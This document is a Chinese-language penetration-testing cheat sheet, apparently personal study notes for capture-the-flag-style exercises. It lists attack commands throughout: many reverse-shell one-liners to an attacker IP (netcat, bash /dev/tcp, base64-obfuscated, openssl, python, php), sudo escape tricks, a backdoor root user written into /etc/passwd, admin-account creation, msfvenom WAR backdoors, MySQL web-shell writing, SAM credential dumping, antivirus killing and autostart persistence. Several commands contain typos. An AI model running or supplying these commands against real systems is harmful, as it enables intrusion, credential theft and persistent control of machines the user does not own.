crul检查协议

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image1.png){width="5.760416666666667in"
height="1.9320100612423448in"}

dirb有时候扫描不到，所以我们用

gobuster dir -u http://172.16.123.106 -x php,bak,txt,html -w
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

同一个字典dirb扫不到而这个可以扫到

最推荐的是dirsearch工具

dirsearch -u url

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image2.png){width="5.760416666666667in"
height="3.8763363954505685in"}

**端口碰撞：端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过特定端口进行连接。**

端口碰撞的主要目的是防止攻击者通过进行端口扫描来扫描系统中潜在的可利用服务，因为除非攻击者发送正确的碰撞序列，否则受保护的端口将显示为关闭。

**kali密码本存放位置**

/[usr]{.mark}/ [share]{.mark}/[wordlists]{.mark}

**如果发现有ftp登录home目录可以考虑是否可以传私钥然后ssh登录提权**

**nc反弹**

被控端：nc -lvvp 6666 -e /bin/sh

控制端：nc 本机ip 6666

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

没有-e参数的反弹shell：

控制端：nc -lvvp 6666

被控端：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f \| /bin/sh -i 2\>&1 \| nc
攻击机ip 6666 \>/tmp/f

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

控制端：nc -lvvp 6666

被控端：mknod backpipe p;nc 攻击者ip 6666 0\<backpipe \| /bin/bash
1\>backpipe 2\>backpipe

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

控制端：nc -lvvp 6666

被控端：bash -i \>&/dev/tcp/攻击者ip/6666 0\>&1

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

控制端：nc -lvvp 6666

被控端：exec 5\<\>/dev/tcp/攻击者ip/6666;cat \<&5 \| while read line;do
\$line 2\>&5 \>&5;done

bash64编码绕过：

bash -c \"echo
YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Lg1LzY2NjYgMD4mMQ==\|base64
-d\|bash -i\"

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

Telnet:

控制端：nc -lvvp 6666

被控端：rm -f a && mknod a p && telnet 攻击者ip 6666 0\<a \| /bib/bash
1\>a

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

Openssl反弹443端口：

1.在远程主机上生成密钥文件

openssl req -x509 -newkey rsa;4096 -keyout ket.pem -out cert.pem -days
365 -nodes

2.在远程主机上启动监视器

openssl s_sever -quiet -key key.pem -cert cert.pem -port 443

3.在目标机上反弹shell

mkfifo /tmp/s;bin/sh -i \< /tmp/s 2\>&1 \| openssl s_client -quiet
-connect 攻击者ip:端口 \> /tmp/s;rm /tmp/s

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

python:

被控端：python -c \'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"攻击机ip\",7777));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);\'

控制端：nc -lvvp 7777

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

php:

被控端：php -r \'\$sock=fsockopen(\"攻击机ip\",4444);exec(\"/bin/sh -i
\<&3 \>&3 2\>&3\");\'

控制端：nc -lvvp 4444

**提权命令：sudo awk \'BEGIN{system(\"/bin/bash\")}\' #awk**

sudo find /home -exec /bin/bash ; #find

sudo cat /etc/shadow #cat我们可以查看 /etc/shadow
文件中的账号密码，并使用john破解

#zip

1.创建一个1.txt，将其压缩为1.zip

2\. sudo zip 1.zip 1.txt -T \--unzip-command=\"sh -c /bin/bash\"

**git**

1.sudo git help add

2.回车如下输入 !/bin/bash

#ed

sudo ed

!/bin/sh

#vim

sudo vim -c\'!sh\'

#man

sudo man man

之后按！按下并按Enter

#lesssud

sudo less /etc/hosts

之后按！按下并按Enter

#more

sudo more /etc/hosts

之后按！按下并按Enter

#nmap

echo \"os.execute(\'/bin/sh\')\"\> /tmp/shell.nse && sudo nmap \--script
= /tmp/shell.nse

#nano

#nano是使用此编辑器的文本编辑器，在您需要切换用户之后，您可以修改pvimasswd文件并将用户添加为root特权。在/etc/passwd中添加此行，以将用户添加为root特权。

touhid:\$6\$bxwJfzor\$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash

sudo nano /sudetc/passwd #现在切换用户密码是：test

su touhid

#apache

使用它我们可以查看系统文件

sudo apache2 -f /etc/shadow

**MYSQL UDF提权**

select sys_exec(\'id\') #执行系统命令

也可以使用

[可以使用MSF里面的** exploit/multi/mysql/mysql_udf_payload **模块自动注入]{.mark}

**windows命令行开启3389远程登录**

echo reg add
\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal
Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f \>
C:\\WINDOWS\\system32\\3389.bat && call 3389.bat

**小皮后门漏洞**

**漏洞影响版本**

phpstudy
2016版PHP5.4.45和PHP5.2.17，phpstudy2018版php-5.2.17和php-5.4.45存在后门。

去掉accept-encoding 的值中间的点

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image3.png){width="5.760416666666667in"
height="0.9576695100612423in"}

**[P065 - 综合渗透测试 - 使用Eternalblue-Doublepulsar
获取主机权限]{.mark}**

导入[Eternalblue-Doublepulsar到msfconsole]{.mark}

[解压:]{.mark}

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image4.png){width="5.760416666666667in"
height="2.832204724409449in"}

复制后缀名为rb的到/usr/share/Metasploit-framework/modules/exploits/windows/smb/

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image5.png){width="5.760416666666667in"
height="0.4605216535433071in"}

**打开msfocnsole**

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image6.png){width="5.760416666666667in"
height="2.1601563867016624in"}

**Options查看配置文件的位置**

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image7.png){width="5.760416666666667in"
height="2.6756036745406826in"}

**然后把文件复制到对应位置**

 

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image8.png){width="5.760416666666667in"
height="0.3881681977252843in"}

文件显示成功

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image9.png){width="5.760416666666667in"
height="1.3245034995625546in"}

对应好漏洞调整

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image10.png){width="5.760416666666667in"
height="2.868579396325459in"}

渗透成功就换攻击模块

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image11.png){width="5.760416666666667in"
height="3.366747594050744in"}

[P060 - 综合渗透测试 - 使用 Java
无效的数组索引漏洞进行鱼叉式渗透测试]{.mark}

[注册邮件后登录]{.mark}

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image12.png){width="5.760416666666667in"
height="4.320312773403325in"}

[构造恶意邮件，本课程将以 Java 客户端漏洞为例来进行下面的渗透]{.mark}

[use exploit/multi/browser/java_storeimagearray调用 Java 的
storeimagearray () 无效的数组索引漏洞]{.mark}

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image13.png){width="5.760416666666667in"
height="2.902594050743657in"}

**smb ，snmp渗透**

**使用nmap -sC -sS -T4可以调用根据扫到的端口使用脚本**

扫到smb用户guest

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image14.png){width="5.760416666666667in"
height="4.320312773403325in"}

可以发现目标机器存在 MSSQL，SMB 等服务，我们使用命令
snmp-check 172.16.1.200 检查一下目标服务器
snmp服务是否存在，若存在则对后面的渗透提供非常大的帮助。

使用snmap-check 工具检测snmp服务

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image15.png){width="5.760416666666667in"
height="4.320312773403325in"}

[发现目标服务器中并不存在 snmp 服务]{.mark}

[使用命令 smbmap -H 172.16.1.200 尝试枚举一下目标的 smb 资源。]{.mark}

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image16.png){width="5.760416666666667in"
height="1.1520833333333333in"}

权限被拒绝

使用匿名用户访问smb

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image17.png){width="5.760416666666667in"
height="1.6196937882764655in"}

Weekly_Reports是可以访问

使用guest用户空密码登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image18.png){width="5.760416666666667in"
height="2.9114020122484687in"}

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image19.png){width="5.760416666666667in"
height="1.510573053368329in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image20.png){width="5.152777777777778in"
height="1.8775306211723535in"}

登录方式不一样有些

Get下载文件（要加双引号）

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image21.png){width="5.760416666666667in"
height="1.0278390201224847in"}

后缀名是.xlsm说明是用了[Excel
在默认的情况下不会自动启用宏，那么既然我们知道该文件可能包含有宏指令，接下来我们就使用命令
olevba "Currency Volume Report.xlsm"来对文件进行分析，]{.mark}

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image22.png){width="5.760416666666667in"
height="4.320312773403325in"}

发现mssql数据库密码和用户

使用msfconsole登录数据库

![localFile.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image23.png){width="5.760416666666667in"
height="1.8671292650918636in"}

**弱口令漏洞**

**ssh远程登录,mysql数据库密码,tomcat密码破解漏洞,**

**ftp远程登录,web后台登录，phpMyAdmin后台泄露弱密码**

ftp与ssh和mysql可以用hydra

列：hydra -L user.txt -P password.txt 192.168.154.131 ssh/mysql/ftp

tomcat用msfconsole跑tomcat_mgr_login攻击载荷

web后台和phpMyAdmin之类的网页跑爆破密码用Burp Suite 抓包爆破

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image24.png){width="5.208333333333333in"
height="3.78125in"}

**未授权漏洞**

**rsync未授权访问漏洞**

Metasploit中关于允许匿名访问的rsync扫描模块：auxiliary/scanner/rsync/modules_list

nmap中针对rsync同步目录列举的脚本

![stickPicture.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image25.png){width="5.760416666666667in"
height="2.533931539807524in"}

检查rsync的同步目录命令：

rsync 172.16.123.115::

任意文件下载：

**rsync -av rsync://IP/同步目录/etc/passwd ./passwd 下
vvb载靶机的/etc/passw到./passswd**

任意文件上传

rsync -av s.txt rsync://IP:873/同步目录/root/ 把s.txt上传到/root目录

**服务器漏洞**

**Apache解析漏洞,Apache目录遍历漏洞,Nginx目录遍历/穿越漏洞，**

**IIS PUT文件上传漏洞，IIS 短文件名猜解，IIS远程代码执行漏洞，**

**IIS解析漏洞，Nginx文件解析漏洞，tomcat/jboss war 后门部署文件，**

**hping3洪水攻击**

**tomcat 远程代码执行漏洞，**PHP CGI参数注入执行漏洞,asp网站默认配置漏洞

**Apache解析漏洞：**

影响版本：apache 1.x - apache 2.x

apache解析有个原则，当碰到不认识的解析名字就会向后解析，如果都不认识就暴露源码。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image26.png){width="5.760416666666667in"
height="2.0228051181102362in"}

**Apache目录遍历漏洞：**就是程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历[服务器](https://cloud.tencent.com/product/cvm?from=10680)上的任意文件。这里的目录跳转符可以是../，也可是../的ASCII编码或者unicode编码等。

目录遍历的标志：Index of /

**Nginx目录遍历，目录穿越：目录跳转符../直接看根目录**

![stickPicture.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image27.png){width="5.760416666666667in"
height="2.9931583552055994in"}

**IIS PUT文件上传漏洞：**

存在iis
put攻击的条件必须iis服务器要在web服务扩展中开启webdav并且网站有写入权限

使用桂林老兵作品可以随便上传文件

![stickPicture.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image28.png){width="5.760416666666667in"
height="4.337155511811024in"}

**IIS 短文件名猜解：**

形成原因就是因为有些文件对应的短文件名没清除

举个例子，有一个数据库备份文件
backup_www.abc.com_20190101.sql，它对应的短文件名是 backup\~1.sql
。因此黑客只要暴力破解出 backup\~1.sql
即可下载该文件，而无需破解完整的文件名。

用 dir /x 查看短文件名对应的一些文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image29.png){width="5.527777777777778in"
height="4.735115923009624in"}

猜解方法

例如：我们创建一个test.aspx的文件进行测试，猜测该文件的路径。

首先，根据访问构造的某个存在的短文件名，会返回404可知，路径存在，且未知路径的最后一位是1；

然后尝试给该文件路径未知部分增加前缀，继续访问如下：

访问构造的某个不存在的短文件名时，会返回400。推断该路径的第一位不是字母c。

**IIS解析漏洞：**

一般是windows server 2003 才有IIS6.0

\<IIS 6.0

当建立\*.asa,\*.asp的格式的文件夹时，其目录的所以文件都当IIS的asp文件来解析

**tomcat/jboss war 后门部署文件：**

影响所有弱密码的tomcat/jboss

破解密码入后门找到上传点

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.11.11 LPORT=4444 -f
war \> shell.war

生成木马war

use exploit/multi/handler

payload java/shell_reverse_tcp

监听

**asp网站默认配置漏洞**

只要是后面是asp.dll的都可以执行所以其中cer后缀和asp后缀是默认执行的后缀。如果可以上传cer或asp就可以写个木马拿到shell

![微信截图_20220708152045.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image30.png){width="5.760416666666667in"
height="4.045117016622922in"}

**hping3洪水攻击**

![微信截图_20220709090913.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image31.png){width="5.760416666666667in"
height="2.4785181539807524in"}

netstat -antup \| 80

看见大量的SYN_RECV那就是被人洪水攻击了

过了路由地址ip就不能伪造

**基操：**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image32.png){width="5.760416666666667in"
height="2.514808617672791in"}

tr解码rot13

echo -n \"rot13加密的字符串\"\|tr \'A-Za-z\' \'N-ZA-Mn-za-m\'
//这里n正好是26字母的第14位

run制定rhosts

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image33.png){width="5.760416666666667in"
height="1.0656769466316711in"}

**下载sam文件数据**

下载system与sam文件的方法

利用注册表(需要administrator权限)

获取当前系统的SAM数据库文件，在另一系统下进行读取，从 sam
中提取目标系统本地用户密码 hash 需要管理员权限。

reg save HKLM\\SYSTEM system.hive

reg save HKLM\\SAM sam.hive

**解密sam文件数据**

使用mimikatz，参数为刚刚下载下来的system与sam文件的路径：

lsadump::sam /sam:sam.hiv /system:system.hiv

nginx日志默认地址 /var/log/nginx/access.log

apache日志默认地址
/usr/local/[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)/logs/access_log

enum4linux -a 192.168.164.192

列举用户

hydra -l administrator -P /usr/share/wordlists/fasttrack.txt -M s.txt
rdp(九头蛇指定ip爆破)

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image34.png){width="5.760416666666667in"
height="2.3671937882764653in"}

namp 扫B端

namp -T4 10.1.1-255.1-255

python一句话执行python

python -c \'print(\"123456\")\'

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image35.png){width="2.763888888888889in"
height="0.6675054680664917in"}

redis指定密码登录：

redis-cli -h 127.0.0.1 -a 123456

linux生成root权限的shan用户

adduser shan \| echo shan \| passwd \--stdin shan\| usermod -g root shan

直接生成管理员用户windows

n**et user shan 123456 /add && net localgroup administrators shan /add**

Start shell:recyclebinfolder 打开回收站

回收站在C盘的路径C盘/Recycled文件夹。

nmap 脚本批量扫描

nmap -script=vuln -T5 IP

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image36.png){width="5.760416666666667in"
height="2.869810804899388in"}

searchsploit

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image37.png){width="5.760416666666667in"
height="3.4728871391076117in"}

searchsploit -m 直接拷贝到当前目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image38.png){width="5.760416666666667in"
height="2.1528827646544184in"}

ms11-064提权

在检索出来的漏洞列表中，第一行的MS11-046漏洞的exp提权脚本程序，比较符合我们利用Windows现有的漏洞进行提权的预期，在后面的步骤里我们将利用该PoC代码程序进行提权。

 

第六步，使用命令searchsploit -m
exploit/windows_x86/local/40564.c把一个exp拷贝到当前工作目录

 

使用命令i686-w64-mingw32-gcc 40564.c -o exp.exe
-lws2_32对PoC代码程序进行编译使其在Windows环境下可以运行

上传并使用

三、PS 命令

适用范围： 适用于 Win2003 & Win2008

微软官方工具包：
<https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools>

2.1 PS 命令提权实验

psexec.exe -accepteula -s -i -d cmd.exe

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image39.png){width="5.760416666666667in"
height="2.2036132983377077in"}

**at提权**

[**适用范围：** Windows2000、Windows 2003、Windows XP]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image40.png){width="5.760416666666667in"
height="2.7374573490813647in"}

ssh 执行命令：

ssh [[root@0.0.0.0]{.underline}](http://root@0.0.0.0) \"ls /\"

windows使用cmd搜索文件内容为flag：

findstr /n /s \"flag\" c:\\\*

linux查找文件内容为flag：

grep -rn \"flag\" /

linux查找制定的文件名里的内容

cat \$(find / -name \"flag.txt\")

弱密码爆破hydra对于mysql最好不开线程，mysql有最大连接数的限制

linux zip

压缩：

zip shan.zip ./shan

解压:

unzip -d ./shan shan.zip

phpmyadmin登录后提权

登录进入phpmyadmin后

使用sql语句查看mysql可以访问的目录：show variables like \'%secure%\';

如果是目录网站根目录可以into outfile 写入一句话木马

select \'\<?php phpinfo();?\>\' into outfile
\'/var/www/html/phpinfo.php\'

mysql日志渗透

查看日志

show variables like \'%general%\'

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image41.png){width="4.930555555555555in"
height="2.501761811023622in"}

使用sql语句 set GLOBAL general_log = 1; 开启日志

需要知道网站根目录

设置日志路径 set global general_log_file=\'/var/www/html/phpinfo.php\'

写入php语句 select \'\<?php phpinfo();?\>\' 将会记录到phpinfo中

服务phpinfo.php就会得到

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image42.png){width="5.760416666666667in"
height="3.5545428696412946in"}

如果没有权限就使用sql语句查看权限 select @@global.secure_file_priv;

mysql一句话日志木马(条件是开了才行)

检查方法：show variables like \'%general%\'

set global general_log=1;set global
general_log_file=\'c:/phpstudy_pro/WWW/1.php\';select \'\<?php
phpinfo();?\>\';

session包含

存储 可通过phpinfo查看session.save_path的值，即存储位置。

![fd80a9784991e6842c09d0ca0c7f62b8.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image43.jpeg){width="5.760416666666667in"
height="0.20318897637795275in"}

image.png

这里用的是phpstudy，常见的存储目录如下

/var/lib/php/sess_PHPSESSID

/var/lib/php/sessions/sess_PHPSESSID

/xxx/tmp/sess_PHPSESSID

/xxxx/tmp/sessions/sess_PHPSESSID

命名 那这个文件是怎么命名的呢？
文件名格式为sess\_\[phpsessid\]。而phpsessid来源于请求的cookie字段。

![cfbf8d00b4daacde8ce9f341a9796916.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image44.jpeg){width="5.760416666666667in"
height="1.699323053368329in"}

就可以像日志提权一样先使用phpmyadminSQL命令执行 select
\'\<?=phpinfo()?\>\'

然后查看PHPSESSID就可以断定目录 CVE-2018-12613可以实现文件包含

**Shell脚本加入开机自启动的方法：**

Linux中脚本设定开机自启动

方法一：

1，在某个目录下创建脚本：例如：/root/hello/wei.sh

(注意：脚本中必须加入：

#!/bin/bash

#chkconfig:2345 10 90

#description:resind

2，cp /root/hello/wei.sh /etc/init.d/wei.sh

(注意：也可以直接在 /etc/init.d下，直接创建wei.sh脚本)

3\. 给脚本执行权限：chmod +x /etc/init.d/wei.sh

4\. 加入开机启动,进/etc/init.d/目录下：chkconfig \--add wei.sh

chkconfig wei.sh on

查看wei.sh开机自启动情况： chkconfig \--list wei.sh

（注意非加入自启动而是手动启动这样：/etc/init.d/wei.sh start）

方法二：

1.写一脚本，Wei.sh 放在、etc/init.d、下面。即/etc/init.d/wei.sh

2，加权限 chmod +x /etc/init.d/wei.sh

3.写入到/etc/rc.local开机自启动文件里：

echo "bash /etc/init.d/wei.sh"\>\> /etc/rc.d/rc.local

4 chmod +x /etc/rc.d/rc.local

**nc后门**

**关闭防火墙**

靶机：nc -lvp 9999 -e /bin/bash

攻击机：nc x.x.x.x 9999

五分钟建站的简易Wordpress论坛，可以尝试查看robots.txt文件，判断cms类型kali有一款针对wordpress论坛的专业网络安全漏洞扫描软件wpscan

**使用alert(document.cookie)弹出用户的cookie**

命令注入

特殊符号

Windows：

\| :直接执行后面的语句

\|\|：前面出错执行后面的

&：前为假执行后面的

&&：前为假直接出错，前为真执行

LINUX：

； ：前执行完执行后

\| ：显示后面的执行结构

\|\|：当前的执行出错执行后面的

&：前面的为假执行后面的语句

&&：前为假出错

注册表自启项

在HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run项下注册自启动项就行了

md5漏洞介绍：

PHP在处理哈希字符串时，它把每一个以"0E"开头的哈希值都解释为0

所以只要v1与v2的md5值以0E开头即可。这样最后php解析到的v1和v2的md5值就都是0了

echo bG92ZQ==\| base64 -d base64解密

蚁剑碰到https就忽略https证书，如果是需要登录才能连接就添加名字为Cookie：值为Cookie值

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image45.png){width="5.760416666666667in"
height="3.852746062992126in"}

nmap -sV
全连接扫两次，如果有执行一次就关闭的后门，那第二次的端口就会少，叫裁判重新打开靶机就行，然后nc后门

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image46.png){width="5.760416666666667in"
height="3.438946850393701in"}

nl ./\* \>\>a 将/的文件目录的名字和文件内容都保存到a

windows使用快捷键Win+R打开运行窗口，虽然\\\\172.16.123.123可以访问这个ip的smb共享文件服务器；

weevely上传下载

:file_upload \<原文件\> \<目标文件\>

:file_download \<原文件\> \<目标文件\>

msf后渗透解决乱码chcp 65001

ftp下载上传

get 《要下载文件》

put 《要上传文件》

**ssh从远程服务器下载文件夹到本地**

scp -r \<用户名\>@\<ssh服务器地址\>:\<文件夹名\> \<本地路径\>

scp -r root@127.20.36.88:\~/test \~/Desktop

将test文件夹直接下载到了本地桌面

**从本地上传文件到服务器上**

scp \<本地文件名\> \<用户名\>@\<ssh服务器地址\>:\<上传保存路径\>

**searchsploit基础用法**

searchsploit drupal (查看drupal漏洞攻击文件)

searchsploit -p 40839.c （查看工具文件相对路径）

vi /usr/share/exploitdb/exploits/linux/local/40847.cpp
（可以查看使用介绍）

python -c \'import pty;pty.spawn(\"/bin/bash\")\'

奇葩端口漏洞

[windows系统常见端口和木马默认使用端口](https://blog.csdn.net/ITxiaobaibai/article/details/114521256)

**编写.sh的程序实现高操作**

vi shan.sh

**git 后台**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image47.png){width="3.8472222222222223in"
height="1.2302766841644794in"}

由此可见有泄露

百度网盘安装包里面下载后

python2 GitHack.py url/.git下载git后台

如果隐写碰到了.git的后台文件就用命令生成flag

**log**

git log 命令查看

git show

**stash**

git stash list 查看

会多出几个文件

git stash apply 重新存储

**index**

git checkout-index 查看

会多出几个文件

**msf关闭杀毒软件**

Run killav

截屏

screenshot

直播

screenshare

**msf开启windows靶机的远程登录**

run getgui -e

**查看内核版本**

uname -r

Linux Kernel\>=2.6.22的所有linux主机（没打过补丁的）

使用常规的溢出漏洞 overlayfs，支持 ubuntu 12.04/14.04/14.10/15.04
和内核版本大于 3.13.0 小于 3.19。

就可以searchsploit dirty 搜索脏牛漏洞

**HTTP头部详解**

User-Agent：使得服务器能够识别客户端的操作系统，游览版本等。（很多数据大量的网站中会记录客户端的操作系统或浏览器版本等存入数据库中）

Cookie：网站为了辨别用户身份，进行session跟踪而存储在用户本地终端上的数据(通常经过加密)

X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实IP，（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件\[通过修改XXF头可以实现伪造IP\])

Clien-IP：同上，不做过多介绍

Referer：浏览器向WEB服务器表明自己是从哪页面链接过来的。

Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image48.png){width="5.760416666666667in"
height="3.18082239720035in"}

Nmap 命令搜索ms17-010漏洞命令可以是其他的漏洞但是要换对端口

Nmap -p445 \--script smb-vuln-ms17-010 172.16.123.114

Kali使用python临时开启HTTP服务

python -m SimpleHTTPServer 80

pyhthon -m httpd.server

靶机下载木马或者其他事情

 Linux
系统上使用 [wget](https://so.csdn.net/so/search?q=wget&spm=1001.2101.3001.7020) 指令即可下载该文件：wget
[[http://xxxx]{.underline}](http://xxxx)

有些是get 和downloa

nc下载文件

kali:

nc -lvp 8888 \< pass.txt

靶机：

nc 192.168.222.128 8888 \> pass.txt

**cewl**

输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：

cewl <http://www.ignitetechnologies.in/>

使用-w参数来将密码字典存储为text文件

**wpscan(针对于wordpress论坛的漏洞扫描工具)**

列举用户

wpscan \--url [[http://www.baidu.com]{.underline}](http://www.baidu.com)
-e u

黄色感叹号表示信息泄露级别，红色表示威胁程度较高的漏洞

wpscan爆破

wpscan \--url dc-2 -U dc-2users.list -P dc-2pass.dic

更改域名，才能访问

开启HTTP服务，输入ip无法连接服务器且IP变域名

说明DNS服务器无法解析该域名

所以我们需要修改hosts文件内容，使域名wordy对应IP

Kali 生产木马 weevely generate pass ./pass.php 连接密码为pass

连接马

weevely  \<url\>  \<password\>

**文件包含**

问号绕过，井号绕过，空格绕过，双写绕过

**远程包含**

**如果使用不了get可以改成post提交**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image49.png){width="5.760416666666667in"
height="3.2402351268591425in"}

**file**

条件：allow_url_fopen: off/on allow_url_include: off/on

Linux：h[ttp://127.0.0.1/FI/LFI.php?file=file:///etc/passwd绝](http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd)对路径

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image50.png){width="5.760416666666667in"
height="3.2402351268591425in"}

